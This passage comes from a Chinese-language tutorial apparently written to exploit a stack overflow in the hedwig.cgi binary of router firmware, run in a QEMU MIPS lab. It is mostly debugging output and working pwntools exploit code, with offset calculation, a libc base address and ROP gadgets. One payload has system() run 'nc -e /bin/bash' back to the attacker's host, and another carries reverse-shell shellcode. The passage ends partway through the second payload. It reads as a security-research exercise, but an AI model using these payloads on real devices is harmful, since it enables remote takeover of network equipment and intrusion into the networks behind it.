    > Host: 192.168.79.143:1234
    > User-Agent: curl/7.47.0
    > Accept: */*
    > Cookie: uid=zh
    > Content-Length: 8
    > 
    FAILEDno xml data.%
然后在mips虚拟机查看log文件：
    root@debian-mipsel:~/squashfs-root# cat /log
    Sun May 24 00:58:11 2020 [1109] *** Mathopd/1.6b9 starting
    Sun May 24 00:58:20 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/]
    Sun May 24 00:58:43 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/hedwig.cgi]
    Sun May 24 00:58:43 2020 [1109] child process 1111 exited with status 255
    Sun May 24 00:59:43 2020 [1109] script timeout to 192.168.79.145[52472]
    Sun May 24 01:00:46 2020 [1109] process_headers: method[POST], nheaders=[4], URL[/hedwig.cgi]
    Sun May 24 01:00:46 2020 [1109] child process 1112 exited with status 255
到这里可以看到我们需要的web服务器以及启动了。
## 5.2-gdbbserver调试
接下来尝试调试`/htdocs/web/hedwig.cgi`文件
    root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
    HTTP/1.1 200 OK
    Content-Type: text/xml
    FAILEDno REQUESTroot@debian-mipsel:~/squashfs-root#
返回no
REQUEST，查看IDA静态反汇编得知没有指定环境变量`REQUEST_METHOD`的值。所以想要触发漏洞进行调试的话，还是需要通过export
设置相关环境变量。
    root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
    root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
    root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
    root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
    root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
    root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
    HTTP/1.1 200 OK
    Content-Type: text/xml
    #之前分析过因为没有post数据
    FAILEDno xml data.
    root@debian-mipsel:~/squashfs-root#
使用`echo 'uid=1234'| /htdocs/web/hedwig.cgi`运行成功。
    root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
    root@debian-mipsel:~/squashfs-root#
接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。
`echo 0 > /proc/sys/kernel/randomize_va_space`
可以编写以下脚本进行动态调试
debug.sh，gdbsever 192.168.79.145是宿主机IP，6666是qemu监听端口。
    #!/bin/bash
    export CONTENT_LENGTH="100"
    export CONTENT_TYPE="application/x-www-form-urlencoded"
    export HTTP_COOKIE="`cat content`"
    export REQUEST_METHOD="POST"
    export REQUEST_URI="/hedwig.cgi"
    echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi
宿主机gdb调试
    gdb-multiarch htdocs/cgibin
    set architecture mips
    target remote 192.168.79.143:6666 #对应qemu地址和端口
    c
得到溢出地址是0x68423668，利用脚本计算偏移为1009
    #./patternLocOffset.py -s 0x68423668 -l 2000 
    [*] Create pattern string contains 2000 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 1009 (adjusted another-endian)
    [+] take time: 0.0007 s
接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。
利用/htdocs/web/hedwig.cgi & cat /proc/pid/maps ， **a &b
先执行a，在执行b，无论a成功与否都会执行b**。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。
    root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
    root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
    root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
    root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
    root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
    root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
    [10] 1052
    cat: /proc/pid/maps: No such file or directory
    root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
    [11] 1054
    cat: /proc/pid/maps: No such file or directory
    [10]+  Stopped                 /htdocs/web/hedwig.cgi
    root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
    [12] 1056
    00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
    0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
    0042d000-0042f000 rwxp 00000000 00:00 0          [heap]
    77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0
    77f92000-77fa1000 ---p 00000000 00:00 0 
    77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0
    77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0
    77fa3000-77fa8000 rw-p 00000000 00:00 0 
    77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1
    77fd1000-77fe1000 ---p 00000000 00:00 0 
    77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1
    77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0
    77ff5000-77ff6000 rw-p 00000000 00:00 0 
    77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0
    77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0
    7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
    7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]
    [11]+  Stopped                 /htdocs/web/hedwig.cgi
    root@debian-mipsel:~/squashfs-root#
## 5.3-编写exp
上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。
  1. system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成`nc -e /bin/bash 192.168.79.145 9999`
        #!/usr/bin/python2
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    base_addr = 0x77f34000
    system_addr_1 = 0x53200-1
    gadget1 = 0x45988
    gadget2 = 0x159cc
    cmd = 'nc -e /bin/bash 192.168.79.145 9999'
    padding = 'A' * 973 #1009-4*9
    padding += p32(base_addr + system_addr_1) # s0
    padding += p32(base_addr + gadget2)       # s1
    padding += 'A' * 4                        # s2
    padding += 'A' * 4                        # s3
    padding += 'A' * 4                        # s4
    padding += 'A' * 4                         # s5
    padding += 'A' * 4                        # s6
    padding += 'A' * 4                        # s7
    padding += 'A' * 4                        # fp
    padding += p32(base_addr + gadget1)       # ra
    padding += 'B' * 0x10
    padding += cmd
    f = open("context",'wb')
    f.write(padding)
    f.close()
生成的context通过scp拷贝到mips虚拟机中并且`nano debug.sh`更改debug.sh
        #!/bin/bash
    export CONTENT_LENGTH="100"
    export CONTENT_TYPE="application/x-www-form-urlencoded"
    export HTTP_COOKIE="uid=`cat context`"
    export REQUEST_METHOD="POST"
    export REQUEST_URI="/hedwig.cgi"
    echo "uid=1234"|/htdocs/web/hedwig.cgi
    #echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi
在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。
  2. 利用sleep(1)调用shellcode
这里的shllcode作用是给指定的IP地址和端口反弹shell，根据[文章](http://shell-storm.org/shellcode/files/shellcode-860.php)修改其中的socket反向连接IP，端口没有改变还是31337。
        #!/usr/bin/python2
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    shellcode = ""
    shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
    shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
    shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
    shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
    #shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
    shellcode += "\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.79.145
    shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
    shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
    shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
    shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
    shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
    shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
    libc_base = 0x77f34000
    sleep = 0x56BD0 #sleep jr ra 0x7678edf4
    gadget1 = 0x57E50
    gadget2 = 0x3B8A8
    gadget3 = 0x14F28
    gadget4 = 0x1DD08#0x15C84#0xBB44
    payload = 'A' * 973 #1009-9*4
    payload += 'A' * 4                         # s0
    payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
    payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
    payload += 'A' * 4                        # s3